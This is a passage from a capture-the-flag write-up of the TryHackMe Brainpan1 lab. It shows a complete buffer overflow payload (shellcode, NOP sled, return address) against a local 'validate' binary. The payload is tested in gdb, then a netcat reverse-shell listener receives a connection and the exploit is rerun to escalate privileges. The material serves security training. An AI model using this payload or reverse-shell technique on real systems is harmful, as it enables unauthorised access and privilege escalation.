... "\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
... "\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7"
... "\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd"
... "\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7"
... "\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e"
... )
>>> print(len(shell))
70
>>> 
```

```bash
run $(python -c "print ('\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
```

test it on my local kali vm:

```bash
(gdb) run $(python -c "print ('\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print ('\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
process 115163 is executing new program: /usr/bin/dash
[Detaching after vfork from child process 115165]
$ whoami
kali
```

And now take our payload to the TryHackMe box:

```bash
# listener running, and then fire the ./thm-linux.py script from before

└─$ sudo rlwrap nc -lnvp 80              
[sudo] password for kali: 
listening on [any] 80 ...
connect to [10.11.55.83] from (UNKNOWN) [10.10.180.131] 38600
whoami
puck
/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
cd /usr/local/bin
cd /usr/local/bin
ls
ls
validate
./validate $(python -c "print ('\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
<e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")      
whoami
whoami
anansi
$ 
```

![privesc validate](/img/brainpan1-validate.png)

Success!

The pathway from here according to the write-ups is circling back around to the script found in the `sudo` method and then having sudo spawn a `/bin/sh` again to elevate user privileges to `root`.

End.
